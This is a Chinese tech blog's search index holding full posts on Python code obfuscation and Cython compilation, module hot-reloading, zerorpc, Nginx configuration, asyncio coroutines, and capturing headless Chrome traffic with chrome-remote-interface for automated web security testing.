<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Python代码加密混淆]]></title>
    <url>../../../../../../../../2019/03/21/1/</url>
    <content type="text"><![CDATA[我多想再见你哪怕匆匆一眼就别离 python作为一种解释型语言，源代码加密本身比较困难。但有时候我们在发布一款python产品时又必须考虑到代码的加密性，以避免源代码泄露。为此，我查阅了一些资料，研究了几种python代码加密的常见方式，在此记录一下。 源代码加密（一）py脚本编译成pyc二进制文件编译命令：1python -m py_compile file.py pyc文件是一个二进制文件，但是可以被很轻松的被逆向，在线反编译工具：https://tool.lu/pyc/。当然也有针对这个问题的解决方案，解决方案是可以通过修改python源代码中的opcode，然后重新编译py代码，可以一定程度上防止被逆向，因为逆向者需要知道被修改的opcode才能还原出来。如果使用私有的Bytecode指令集，那么通常的Python反汇编器和反编译器无法工作在由你私有Python编译器产生的pyc文件上，也相当于保护了你的Python代码。但是这么做的代价是你的Python应用只能在你的私有Python解释器上运行。（实际在发布一款产品时，并不适用） （二）py脚本打包成exe文件 exe文件针对windows平台使用，一般是使用打包程序（py2exe、PyInstaller等）打包成exe，这些工具用于将一个Python项目打包成单个可执行的文件，方便（在没有Python环境的机器上）使用。但通过压缩包可以方便地得到所有pyc文件或源文件，与C/C++编译生成的可执行文件有本质上的区别，基本上是零保护，所以需要将exe进行加壳操作。 （三）py脚本编译成c文件（cython）用cython将核心代码py模块文件转化成.c文件，再用gcc编译成so（unix）文件，或者将其编译成pyd（windows）文件。 编译过程：1、服务器安装依赖12pip install pythonyum install python-devel gcc 2、编写setup.py文件，内容如下：12345678910from distutils.core import setupfrom Cython.Build import cythonizesetup( ext_modules = cythonize("test.py",language_level=2))# 批量编译setup( ext_modules = cythonize(["test.py","test2.py".......],language_level=2)) 3、运行以下命令1python setup.py build_ext —inplace 会生成一个test.so，删除其余文件，直接引用test.so即可（跟引用py文件一样） 源代码混淆除了加密以外，还可以对源代码进行混淆，增加源代码的阅读难度。这个有很多第三方库，我列举几个：https://pypi.org/project/pyminifier/https://github.com/astrand/pyobfuscatehttp://pyob.oxyry.com/ pyminifier库用法：12pyminifier -O test.py &gt;&gt; test_py.pypyminifier --replacement-length=1 --obfuscate-builtins --obfuscate-import-methods --obfuscate-variables test.py]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python代码热重载函数reload]]></title>
    <url>../../../../../../../../2018/11/27/1/</url>
    <content type="text"><![CDATA[我走过山时，山不说话，我路过海时，海不说话，小毛驴滴滴答答，倚天剑伴我走天涯。大家都说我因为爱着杨过大侠，才在峨嵋山上出了家，其实我只是爱上了峨嵋山上的云和霞，像极了十六岁那年的烟花。 代码热重载是在一个项目中比较常见的需求，尤其是在扫描服务的开发中，扫描插件的代码需要经常修整，因此如何做到插件代码能够热重载加载，而不是每次修改代码后需要重启服务就变得尤为重要。由于最近正好在一个Python项目中需要实现热重载需求，因此写了个python版的代码热重载demo，仅供参考。 python中的reload函数python2中的reload函数可以直接使用，无需导入第三方模块，可以直接使用：1reload(module) # reload接收的参数必须是已经导入的模块 python3中的reload函数移到了imp库里面，因此需要导入：12from imp import reloadreload(module) demo_1demo1是基于最常见的需求，即同一个目录下有2个文件（plugin.py，scan.py），scan.py文件调用plugin.py文件。 plugin.py文件如下：1print "plugin start scan ......" scan.py文件如下：12345import timeimport pluginwhile 1: reload(plugin) time.sleep(1) 运行scan.py，然后手工修改plugin.py文件内容，观察输出的变化。 demo2demo2会稍微复杂一点点，即同一个目录下有2个文件（plugin.py，scan.py），scan.py文件调用plugin.py文件里面的crack函数。 plugin.py文件如下：12def crack(): print "plugin start scan ......" scan.py文件如下：123456import timeimport pluginwhile 1: reload(plugin) eval("plugin.crack()") time.sleep(1) 运行结果跟demo1一样，就是在调用之前先reload一下模块，然后再利用eval调用模块的函数。 demo3demo3针对更为现实的需求，即不同目录下的2个文件（./scan.py，./plugins/plugin.py），scan.py文件调用plugins目录下的plugin.py文件里面的crack函数。 plugin.py文件如下：12def crack(): print "plugin start scan ......" scan.py文件如下：1234567import timeexec("import plugins.plugin")while 1: reload(eval("plugins.plugin")) eval("plugins.plugin.crack()") time.sleep(1) 运行结果跟demo1一样，这样需要注意的是，reload不支持from plugins improt plugin的方式重载模块，因此可以使用import plugins.plugin的方式导入模块并重载。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>reload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于rpc通信的原理及python中的rpc框架]]></title>
    <url>../../../../../../../../2018/10/22/1/</url>
    <content type="text"><![CDATA[这场名叫人生的旅途，有太多风景不及回顾 最近在逛知乎的时候无意中看到了一则技术贴，讨论的主题大概是：”Web开发中，使用RPC还是RESTFUL更好？”（其实是很老的话题了）。由于本人之前在web开发中只使用过restful，因此对这个问题的答案本身并不清楚，于是便抱着学习的态度查阅了一番资料，事后觉得有必要在此记录一番。 概念 REST表示的是描述性状态传递（representational state transfer），REST整个就是关于 客户端和服务端之间的关系的，其中服务端要提供格式简单的描述性数据，常用的是JSON和XML。 RPC指的是远程过程调用(remote procedure call)，本质上在JavaScript、PHP、Python等中调用都是一样的：取方法名，传参数。因为不是每个人都喜欢XML，RPC-API可以使用 JSON-RPC协议，也可以考虑自定义基于JSON的API，像Slack是用它的Web-API实现的。 区别与类同 基于RPC的API适用于动作（过程、命令等）；基于REST的API适用于领域模型（资源或实体），基于数据的CRUD (create, read, update, delete)操作。 接口调用通常包含两个部分，序列化和通信协议。常见的序列化协议包括json、xml、hession、protobuf、thrift、text、bytes等；通信比较流行的是http、soap、websockect，RPC通常基于TCP实现。那么restful使用的序列化协议通常是json，通信协议是http；rpc是一种通信协议，因此如果序列化使用json的话，那么就是json-rpc。 大牛们的见解 大牛1：restful首先是要求必须把所有的应用定义成为“resource”，然后只能针对资源做有限的四种操作。然而所有的接口，服务器端原本就存在有相应的函数，它们本来就有自身的命名空间，接受的参数、返回值、异常等等。只需要采用轻便的方式暴露出来即可，无需把一堆函数重新归纳到“资源”，再削减脑袋把所有的操作都映射为“增删改查”。 大牛2：RPC的思想是把本地函数映射到API，也就是说一个API对应的是一个function，我本地有一个getAllUsers，远程也能通过某种约定的协议来调用这个getAllUsers。RPC中的主体都是动作，是个动词，表示我要做什么。而REST则不然，它的URL主体是资源，是个名词。 大牛3：http相对更规范、标准、通用，无论哪种语言都支持http协议。RPC协议性能要高的多，例如Protobuf、Thrift、Kyro等。对外开放给全世界的API推荐采用RESTful，是否严格按照规范是一个要权衡的问题。要综合成本、稳定性、易用性、业务场景等等多种因素。内部调用推荐采用RPC方式。当然不能一概而论，还要看具体的业务场景。 以上答案来源：https://blog.csdn.net/douliw/article/details/52592188https://www.zhihu.com/question/28570307 个人见解接下来谈谈个人见解～！～，好吧，目前我没啥见解，先让我自己动手用用看rpc协议再说。 python的rdc协议框架-zerorpc Zerorpc是一个基于ZeroMQ和MessagePack开发的远程过程调用协议（RPC）实现。和 Zerorpc 一起使用的 Service API 被称为 zeroservice。Zerorpc 可以通过编程或命令行方式调用。官方demo.py如下：123456789101112131415161718import zerorpcclass Cooler(object): """ Various convenience methods to make things cooler. """ def add_man(self, sentence): """ End a sentence with ", man!" to make it sound cooler, and return the result. """ return sentence + ", man!" def add_42(self, n): """ Add 42 to an integer argument to make it cooler, and return the result. """ return n + 42 def boat(self, sentence): """ Replace a sentence with "I'm on a boat!", and return that, because it's cooler. """ return "I'm on a boat!"s = zerorpc.Server(Cooler())s.bind("tcp://0.0.0.0:4242")s.run() 运行以上代码：12$ zerorpc -j tcp://localhost:4242 add_42 143 分析一下：从demo来看，就是远程通过rpc协议（tcp）进行了函数调用！！！这个操作还是有点666的，因为使用restful只能对资源或者说数据进行操作，而rpc协议直接对函数进行操作，且代码简单。 参考一下github：https://github.com/dotcloud/zerorpc-python 个人见解 简单说下个人理解，个人认为rpc与restful本身定位方向是有所不同的，restful偏向资源或者说数据的通信，注重接口的规范性，总之更加通用；rpc协议用于服务功能的调用，具体说就是函数的调用，可以适合更复杂通信需求的场景。因此以上有个大牛的说法我还是比较认同的，对内可以选择使用rpc，因为性能优势等原因，而对外使用resutful，因为通用。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>rpc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx配置相关笔记]]></title>
    <url>../../../../../../../../2018/07/26/1/</url>
    <content type="text"><![CDATA[好久没更，来水一篇～！～ 就在刚刚，我花了四百大洋租了台腾讯云香港的服务器（～心在滴血～），因此我的博客终于可以宣告回国了。PS：之前一直使用github-page，众所周知速度贼慢，后面换成了新加坡的VPS服务器，速度就更慢了，没办法只能花大价钱买国内的云服务器。博客迁移得过程比较简单，无非就是添加nginx解析，因此本篇有点水，主要为了记录一下nginx配置web服务的一些笔记。 http 301 https我的博客使用了腾讯云免费签发的证书，因此可以使用https访问，默认情况下http也是可以访问的，那么如何将http请求301重定向到https，便是第一个要解决的问题。编辑/etc/nginx/nginx.conf文件：12345678910111213......server &#123; listen 80; server_name thief.one; return 301 https://$server_name$request_uri;&#125;server &#123; listen 443; server_name thief.one; ......&#125;...... 创建一个80端口，一个443端口的web服务，并且将80端口的服务重定向到https://….。重启nginx后，访问http://thief.one会被301重定向到https://thief.one 禁止访问某些目录文件由于我的博客项目存放在git上，因此服务器web目录内含有.git目录，也算是敏感信息泄露（当然都是一些静态的网页，其实也没有什么危害），那么如何在nginx中配置访问.git目录403是要解决的第二个问题。编辑/etc/nginx/nginx.conf文件：123456789server &#123; listen 443; server_name thief.one; ...... location /.git/ &#123; deny all; &#125;&#125; 添加一个location，禁止访问某目录。重启nginx后，尝试访问https://thief.one/.git/config 返回403 负载均衡这个之前总结过：https://thief.one/2017/08/22/1/ 只能通过域名访问如果博客不想通过IP被访问到，需要在nginx上配置禁止ip访问，或者访问ip跳转到域名。编辑/etc/nginx/nginx.conf文件：12345server &#123; listen 80 default_server; listen 443 default_server; return 403&#125; 重启nginx，访问：http://150.109.106.49/ 返回403。 权限问题首先说明一下，一般我不推荐使用root权限启动nginx服务。但如果nginx服务是用root权限安装的，且网站放在root目录下，启动nginx解析网站会有权限问题（因为配置文件中默认不是用root权限启动），因此需要更改配置文件为：1user root; 更安全的方法是用普通用户权限安装nginx，并将web目录移到普通用户目录下，用普通用户权限启动nginx服务。 nginx配置相关问题笔记，之后我都会记录在此篇中]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python3.5协程学习研究]]></title>
    <url>../../../../../../../../2018/06/21/1/</url>
    <content type="text"><![CDATA[今夕何夕故人不来迟暮连山黛 之前有研究过python协程相关的知识，但一直没有进行深入探究。平常工作中使用的也还是以python2为主，然而最近的项目需要使用python3协程相关的内容，因此凑出时间学习了一番python3的协程语法。 本篇主要以介绍python3.5的async/await协程语法为主，因为这种语法看上去很别扭，不容易理解。如果对python协程基础不是很了解，建议可以先看此篇：Python协程。 协程函数（异步函数） 我们平常使用最多的函数都是同步函数，即不同函数执行是按顺序执行的。那么什么是异步函数呢？怎么创建异步函数？怎么在异步函数之间来回切换执行？不急，请往下看。 创建协程函数先来看下普通函数：123456789101112def test1(): print("1") print("2")def test2(): print("3") print("4")a = test1()b = test2()print(a,type(a))print(b,type(b)) 运行以上代码得到结果：1234561234None &lt;class 'NoneType'&gt;None &lt;class 'NoneType'&gt; 说明：程序顺序执行了test1、test2函数，在调用函数的时候就自动进入了函数体，并执行了函数的内容。 然后使用async关键词将普通函数变成协程函数，即异步函数：12345678910async def test1(): print("1") print("2")async def test2(): print("3") print("4")print(test1())print(test2()) 运行以上代码得到结果：123456&lt;coroutine object test1 at 0x109f4c620&gt;asyncio_python3_test.py:16: RuntimeWarning: coroutine 'test1' was never awaited print(test1())&lt;coroutine object test2 at 0x109f4c620&gt;asyncio_python3_test.py:17: RuntimeWarning: coroutine 'test2' was never awaited print(test2()) 说明：忽略结果中的告警，可以看到调用函数test1、test2的时候，并没有进入函数体且执行函数内容，而是返回了一个coroutine（协程对象）。 除了函数外，类的方法也可以使用async关键词将其变成协程方法：123class test: async def run(self): print("1") 执行协程函数 前面我们成功创建了协程函数，并且在调用函数的时候返回了一个协程对象，那么怎么进入函数体并执行函数内容呢？类似于生成器，可以使用send方法执行函数，修改下前面的代码：12345678910111213async def test1(): print("1") print("2")async def test2(): print("3") print("4")a = test1()b = test2()a.send(None)b.send(None) 运行以上代码得到以下结果：123456712Traceback (most recent call last): File "asyncio_python3_test.py", line 19, in &lt;module&gt; a.send(None)StopIterationsys:1: RuntimeWarning: coroutine 'test2' was never awaited 说明：程序先执行了test1协程函数，当test1执行完时报了StopIteration异常，这是协程函数执行完饭回的一个异常，我们可以用try except捕捉，来用判断协程函数是否执行完毕。1234567891011121314151617181920212223async def test1(): print("1") print("2")async def test2(): print("3") print("4")a = test1()b = test2()try: a.send(None) # 可以通过调用 send 方法，执行协程函数except StopIteration as e: print(e.value) # 协程函数执行结束时会抛出一个StopIteration 异常，标志着协程函数执行结束，返回值在value中 passtry: b.send(None) # 可以通过调用 send 方法，执行协程函数except StopIteration: print(e.value) # 协程函数执行结束时会抛出一个StopIteration 异常，标志着协程函数执行结束，返回值在value中 pass 运行以上代码得到以下结果：12341234 说明：程序先执行了test1函数，等到test1函数执行完后再执行test2函数。从执行过程上来看目前协程函数与普通函数没有区别，并没有实现异步函数，那么如何交叉运行协程函数呢？ 交叉执行协程函数（await） 通过以上例子，我们发现定义协程函数可以使用async关键词，执行函数可以使用send方法，那么如何实现在两个协程函数间来回切换执行呢？这里需要使用await关键词，修改一下代码：123456789101112131415161718192021222324import asyncioasync def test1(): print("1") await asyncio.sleep(1) # asyncio.sleep(1)返回的也是一个协程对象 print("2")async def test2(): print("3") print("4")a = test1()b = test2()try: a.send(None) # 可以通过调用 send 方法，执行协程函数except StopIteration: # 协程函数执行结束时会抛出一个StopIteration 异常，标志着协程函数执行结束 passtry: b.send(None) # 可以通过调用 send 方法，执行协程函数except StopIteration: pas 运行以上函数得到以下结果：123134 说明：程序先执行test1协程函数，在执行到await时，test1函数停止了执行（阻塞）；接着开始执行test2协程函数，直到test2执行完毕。从结果中，我们可以看到，直到程序运行完毕，test1函数也没有执行完（没有执行print(“2”)），那么如何使test1函数执行完毕呢？可以使用asyncio自带的方法循环执行协程函数。 await与阻塞 使用async可以定义协程对象，使用await可以针对耗时的操作进行挂起，就像生成器里的yield一样，函数让出控制权。协程遇到await，事件循环将会挂起该协程，执行别的协程，直到其他的协程也挂起或者执行完毕，再进行下一个协程的执行，协程的目的也是让一些耗时的操作异步化。 注意点：await后面跟的必须是一个Awaitable对象，或者实现了相应协议的对象，查看Awaitable抽象类的代码，表明了只要一个类实现了await方法，那么通过它构造出来的实例就是一个Awaitable，并且Coroutine类也继承了Awaitable。 自动循环执行协程函数 通过前面介绍我们知道执行协程函数需要使用send方法，但一旦协程函数执行过程中切换到其他函数了，那么这个函数就不在被继续运行了，并且使用sned方法不是很高效。那么如何在执行整个程序过程中，自动得执行所有的协程函数呢，就如同多线程、多进程那样，隐式得执行而不是显示的通过send方法去执行函数。 事件循环方法前面提到的问题就需要用到事件循环方法去解决，即asyncio.get_event_loop方法，修改以上代码如下：12345678910111213import asyncioasync def test1(): print("1") await test2() print("2")async def test2(): print("3") print("4")loop = asyncio.get_event_loop()loop.run_until_complete(test1()) 运行以上代码得到以下结果：12341342 说明：asyncio.get_event_loop方法可以创建一个事件循环，然后使用run_until_complete将协程注册到事件循环，并启动事件循环。 task任务 由于协程对象不能直接运行，在注册事件循环的时候，其实是run_until_complete方法将协程包装成为了一个任务（task）对象。所谓task对象是Future类的子类，保存了协程运行后的状态，用于未来获取协程的结果。我们也可以手动将协程对象定义成task，修改以上代码如下：1234567891011121314import asyncioasync def test1(): print("1") await test2() print("2")async def test2(): print("3") print("4")loop = asyncio.get_event_loop()task = loop.create_task(test1())loop.run_until_complete(task) 说明：前面说到task对象保存了协程运行的状态，并且可以获取协程函数运行的返回值，那么具体该如何获取呢？这里可以分两种方式，一种需要绑定回调函数，另外一种则直接在运行完task任务后输出。值得一提的是，如果使用send方法执行函数，则返回值可以通过捕捉StopIteration异常，利用StopIteration.value获取。 直接输出task结果当协程函数运行结束后，我们需要得到其返回值，第一种方式就是等到task状态为finish时，调用task的result方法获取返回值。12345678910111213141516import asyncioasync def test1(): print("1") await test2() print("2") return "stop"async def test2(): print("3") print("4")loop = asyncio.get_event_loop()task = asyncio.ensure_future(test1())loop.run_until_complete(task)print(task.result()) 运行以上代码得到以下结果：123451342stop 回调函数 获取返回值的第二种方法是可以通过绑定回调函数，在task执行完毕的时候可以获取执行的结果，回调的最后一个参数是future对象，通过该对象可以获取协程返回值。12345678910111213141516171819import asyncioasync def test1(): print("1") await test2() print("2") return "stop"async def test2(): print("3") print("4")def callback(future): print('Callback:',future.result()) # 通过future对象的result方法可以获取协程函数的返回值loop = asyncio.get_event_loop()task = asyncio.ensure_future(test1()) # 创建task，test1()是一个协程对象task.add_done_callback(callback) # 绑定回调函数loop.run_until_complete(task) 运行以上代码得到以下结果：123451342Callback: stop 如果回调函数需要接受多个参数，可以通过偏函数导入，修改代码如下：123456789101112131415161718192021import asyncioimport functoolsasync def test1(): print("1") await test2() print("2") return "stop"async def test2(): print("3") print("4")def callback(param1,param2,future): print(param1,param2) print('Callback:',future.result())loop = asyncio.get_event_loop()task = asyncio.ensure_future(test1())task.add_done_callback(functools.partial(callback,"param1","param2"))loop.run_until_complete(task) 说明：回调函数中的future对象就是创建的task对象。 future对象 future对象有几个状态：Pending、Running、Done、Cancelled。创建future的时候，task为pending，事件循环调用执行的时候当然就是running，调用完毕自然就是done，如果需要停止事件循环，就需要先把task取消，可以使用asyncio.Task获取事件循环的task。 协程停止 前面介绍了使用事件循环执行协程函数，那么怎么停止执行呢？在停止执行协程前，需要先取消task，然后再停止loop事件循环。123456789101112131415161718192021222324import asyncioasync def test1(): print("1") await asyncio.sleep(3) print("2") return "stop"tasks = [ asyncio.ensure_future(test1()), asyncio.ensure_future(test1()), asyncio.ensure_future(test1()),]loop = asyncio.get_event_loop()try: loop.run_until_complete(asyncio.wait(tasks))except KeyboardInterrupt as e: for task in asyncio.Task.all_tasks(): task.cancel() loop.stop() loop.run_forever()finally: loop.close() 运行以上代码，按ctrl+c可以结束执行。 本文中用到的一些概念及方法 event_loop事件循环：程序开启一个无限的循环，当把一些函数注册到事件循环上时，满足事件发生条件即调用相应的函数。 coroutine协程对象：指一个使用async关键字定义的函数，它的调用不会立即执行函数，而是会返回一个协程对象，协程对象需要注册到事件循环，由事件循环调用。 task任务：一个协程对象就是一个原生可以挂起的函数，任务则是对协程进一步封装，其中包含任务的各种状态。 future：代表将来执行或没有执行的任务的结果，它和task上没有本质的区别 async/await关键字：python3.5用于定义协程的关键字，async定义一个协程，await用于挂起阻塞的异步调用接口。 并发与并行 并发通常指有多个任务需要同时进行，并行则是同一时刻有多个任务执行。用多线程、多进程、协程来说，协程实现并发，多线程与多进程实现并行。 asyncio协程如何实现并发 asyncio想要实现并发，就需要多个协程来完成任务，每当有任务阻塞的时候就await，然后其他协程继续工作，这需要创建多个协程的列表，然后将这些协程注册到事件循环中。这里指的多个协程，可以是多个协程函数，也可以是一个协程函数的多个协程对象。1234567891011121314151617181920212223import asyncioasync def test1(): print("1") await asyncio.sleep(1) print("2") return "stop"a = test1()b = test1()c = test1()tasks = [ asyncio.ensure_future(a), asyncio.ensure_future(b), asyncio.ensure_future(c),]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) # 注意asyncio.wait方法for task in tasks: print("task result is ",task.result()) 运行以上代码得到以下结果：123456789111222task result is stoptask result is stoptask result is stop 说明：代码先是定义了三个协程对象，然后通过asyncio.ensure_future方法创建了三个task，并且将所有的task加入到了task列表，最终使用loop.run_until_complete将task列表添加到事件循环中。 协程爬虫 前面介绍了如何使用async与await创建协程函数，使用asyncio.get_event_loop创建事件循环并执行协程函数。例子很好地展示了协程并发的高效，但在实际应用场景中该如何开发协程程序？比如说异步爬虫。我尝试用requests模块、urllib模块写异步爬虫，但实际操作发现并不支持asyncio异步，因此可以使用aiohttp模块编写异步爬虫。 aiohttp实现1234567891011121314import asyncioimport aiohttpasync def run(url): print("start spider ",url) async with aiohttp.ClientSession() as session: async with session.get(url) as resp: print(resp.url)url_list = ["https://thief.one","https://home.nmask.cn","https://movie.nmask.cn","https://tool.nmask.cn"]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) 运行以上代码得到以下结果：12345678start spider https://thief.onestart spider https://home.nmask.cnstart spider https://movie.nmask.cnstart spider https://tool.nmask.cnhttps://movie.nmask.cnhttps://home.nmask.cnhttps://tool.nmask.cnhttps://thief.one 说明：aiohttp基于asyncio实现，既可以用来写webserver，也可以当爬虫使用。 requests实现 由于requests模块阻塞了客户代码与asycio事件循环的唯一线程，因此在执行调用时，整个应用程序都会冻结，但如果一定要用requests模块，可以使用事件循环对象的run_in_executor方法，通过run_in_executor方法来新建一个线程来执行耗时函数，因此可以这样修改代码实现：1234567891011121314import asyncioimport requestsasync def run(url): print("start ",url) loop = asyncio.get_event_loop() response = await loop.run_in_executor(None, requests.get, url) print(response.url) url_list = ["https://thief.one","https://home.nmask.cn","https://movie.nmask.cn","https://tool.nmask.cn"]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) 如果要给requests带上参数，可以使用functools：12345678910111213141516171819import asyncioimport requestsimport functoolsasync def run(url): print("start ",url) loop = asyncio.get_event_loop() try: response = await loop.run_in_executor(None,functools.partial(requests.get,url=url,params="",timeout=1)) except Exception as e: print(e) else: print(response.url)url_list = ["https://thief.one","https://home.nmask.cn","https://movie.nmask.cn","https://tool.nmask.cn"]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) asyncio中使用阻塞函数 如同前面介绍如何在asyncio中使用requests模块一样，如果想在asyncio中使用其他阻塞函数，该怎么实现呢？虽然目前有异步函数支持asyncio，但实际问题是大部分IO模块还不支持asyncio。 阻塞函数在asyncio中使用的问题 阻塞函数(例如io读写，requests网络请求)阻塞了客户代码与asycio事件循环的唯一线程，因此在执行调用时，整个应用程序都会冻结。 解决方案 这个问题的解决方法是使用事件循环对象的run_in_executor方法。asyncio的事件循环在背后维护着一个ThreadPoolExecutor对象，我们可以调用run_in_executor方法，把可调用对象发给它执行，即可以通过run_in_executor方法来新建一个线程来执行耗时函数。 run_in_executor方法1AbstractEventLoop.run_in_executor(executor, func, *args) executor 参数应该是一个 Executor 实例。如果为 None，则使用默认 executor。 func 就是要执行的函数 args 就是传递给 func 的参数 实际例子（使用time.sleep()）：1234567891011121314151617import asyncioimport timeasync def run(url): print("start ",url) loop = asyncio.get_event_loop() try: await loop.run_in_executor(None,time.sleep,1) except Exception as e: print(e) print("stop ",url)url_list = ["https://thief.one","https://home.nmask.cn","https://movie.nmask.cn","https://tool.nmask.cn"]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) 运行以上代码得到以下函数：12345678start https://thief.onestart https://home.nmask.cnstart https://movie.nmask.cnstart https://tool.nmask.cnstop https://thief.onestop https://movie.nmask.cnstop https://home.nmask.cnstop https://tool.nmask.cn 说明：有了run_in_executor方法，我们就可以使用之前熟悉的模块创建协程并发了，而不需要使用特定的模块进行IO异步开发。 参考https://www.oschina.net/translate/playing-around-with-await-async-in-python-3-5https://www.jianshu.com/p/b5e347b3a17chttps://zhuanlan.zhihu.com/p/27258289https://juejin.im/entry/5aabb949f265da23a04951df]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>协程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用chrome_remote_interface实现程序化、自动化Web安全测试]]></title>
    <url>../../../../../../../../2018/06/07/1/</url>
    <content type="text"><![CDATA[高考加油！ 如果要问有哪些抓包神器或者流量分析工具？以下几款工具是必须要提的，burpsuite（跨平台）、fiddler（windows下抓包神器）、wireshark（经典网络抓包工具）、justniffer（与前面几个使用代理获取流量不一样的是，justniffer是基于网卡获取流量）等。以上这几款工具之前我有单独成文介绍过，如有需要可点击蓝色链接移步。 那么如果问有哪些程序化的抓包工具？（注明一下这里的程序化指的是可编程）首先burpsuite算一个，因为我们可以开发扩展工具（burpsuite插件开发之检测越权访问漏洞）；另外fiddle也算一个，可以编辑配置文件，达到扩展功能，之前也介绍过。 那么如果问有哪些即可以实现程序化又可以实现自动化的抓包工具？（注明一下这里的自动化是指自动产生流量）这个问题有点拗口，你可能会想为什么一个抓包工具要负责产生流量，流量交给爬虫岂不是更好？这个问题暂且放一放，继续往下看。 自动化安全测试 平常我们经常会使用burpsuite等工具检测一个网站的安全性，检测方法不外乎使用浏览器访问网站且把流量代理到burpsuite上，然后在burpsuite上通过拦截、修改、重放流量等方式测试网站安全性。然而当要测试的网站非常多时，有没有一个更自动化、更省力的方式去测试呢？方案肯定是有的，简单来说要实现自动化web安全测试无非要解决几个问题，首先是流量怎么产生？然后是怎么从流量中分析出漏洞？ 自动化测试方案：主动扫描器 市面上基于爬虫的主动扫描器就是一种自动化安全测试工具，首先它的流量是通过爬虫爬取url主动产生的，然后利用一些漏洞插件去构造不同的访问请求。短板：目前市面上扫描器爬虫大多基于web1.0，无法加载js渲染网页，而现在越来越多的网站使用web2.0技术实现前后端数据交互。 自动化测试方案：被动扫描器 一些大厂内部自研的被动扫描器，首先它的流量不是通过爬虫主动获取的，而是通过监听交换机等网络设备的网卡流量，然后利用一些漏洞插件去分析流量中存在漏洞的点。短板：适合大厂各业务线安全检查不适合测试某个特定的网站，因为需要人为访问网站产生流量。 自动化测试方案：selenium+流量获取工具+漏洞插件 selenium是一款网站自动化测试工具，可以程序化的操作浏览器，实现自动化产生流量。再结合抓包工具以及漏洞检测插件，应该就可以解决流量获取以及漏洞检测的问题。短板：用selenium只能实现一些简单的浏览器操作，对于检测复杂的网站系统，似乎不够用，而且速度很慢，性能很差。 自动化测试方案：chrome_remote_interface+漏洞插件 之前我介绍过headless chrome，也介绍过phantomjs等web2.0爬虫工具，目前推荐去学习使用headless-chrome。headless chrome工具是用来自动加载js，获取渲染后的页面源码，解决web2.0爬虫之困。而chrome_remote_interface是一个更底层的工具，可以用来分析协议，简单说就是可以分析整个渲染过程，以及截取分析过程中的流量。就类似您打开了chrome浏览器的审查元素功能，然后刷新一下页面，查看一下network信息。 chrome_remote_interface介绍chrome_remote_interface是一个开源项目，项目地址，并且支持命令行、编码两种方式，且使用node.js开发。 安装使用因为chrome_remote_interface是基于nodejs的，因此需要安装npm包管理工具。1yum install npm -y 然后创建一个目录，初始化一个项目1npm init 在目录下安装chrome_remote_interface1npm install chrome-remote-interface 创建一个简单的nodejs程序(nmask.js)：1234567891011121314151617181920212223242526272829303132const CDP = require('chrome-remote-interface');// node nmask.js https://nmask.cnvar options = process.argv;var target_url = options[2];CDP((client) =&gt; &#123; // extract domains const &#123;Network, Page&#125; = client; // setup handlers Network.requestWillBeSent((params) =&gt; &#123; console.log(params.request.url); &#125;); Page.loadEventFired(() =&gt; &#123; client.close(); &#125;); // enable events then start! Promise.all([ Network.enable(), Page.enable() ]).then(() =&gt; &#123; return Page.navigate(&#123;url: target_url&#125;);//输出请求的url &#125;).catch((err) =&gt; &#123; console.error(err); client.close(); &#125;);&#125;).on('error', (err) =&gt; &#123; console.error(err);&#125;); 说明：在运行这段程序前，必须要在系统上安装chrome以及启动chrome headless监听模式，具体怎么安装chrome headless可以移步：headless chrome and api启动chrome headless监听模式：123chrome --headless --remote-debugging-port=9222或者google-chrome --headless --remote-debugging-port=9222 然后另外开启一个窗口，运行nodejs：1node nmask.js https://thief.one 运行结果如下：(输出渲染过程中请求的所有url) chrome_remote_interface for python 由于chrome_remote_interface是nodejs实现的，因此对于不熟悉nodejs的朋友来说coding成本比较高。然而好在已经有外国友人用python封装了一个工具，项目地址，虽然目前此项目尚处于初级阶段，但实实在在地解决了我的问题。 安装使用基于是用python3.5开发的，那么就clone一下项目，直接安装吧：12git clone https://github.com/wasiher/chrome-remote-interface-python.gitpython3 setup.py install 编写一个python版的程序(nmask.py)：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#! -*- coding:utf-8 -*-'''__author__="nMask"__Date__="7 Jun 2018"__Blog__="https://thief.one"__version__="1.0"__py_version__="3.5"'''import asyncioimport chrome_remote_interfaceclass callbacks(object): ''' callback class ''' target_url = '' result = [] async def start(tabs): await tabs.add() async def tab_start(tabs, tab): await tab.Page.enable() await tab.Network.enable() await tab.Page.navigate(url=callbacks.target_url) async def network__response_received(tabs, tab, requestId, loaderId, timestamp, type, response, **kwargs): ''' print(response.requestHeaders) print(dir(response)) more response attribute https://chromedevtools.github.io/devtools-protocol/tot/Network#type-Response ''' try: body = tabs.helpers.old_helpers.unpack_response_body(await tab.Network.get_response_body(requestId=requestId)) except tabs.FailResponse as e: print('[Error]', e) else: print(response.url,response.status,len(body)) callbacks.result.append((response.url,response.status,len(body))) async def page__frame_stopped_loading(tabs, tab, **kwargs): print("[Info]Finish") tabs.terminate() async def any(tabs, tab, callback_name, parameters): passif __name__=="__main__": callbacks.target_url = "http://www.baidu.com" asyncio.get_event_loop().run_until_complete(chrome_remote_interface.Tabs.run('localhost', 9222, callbacks)) print(callbacks.result) 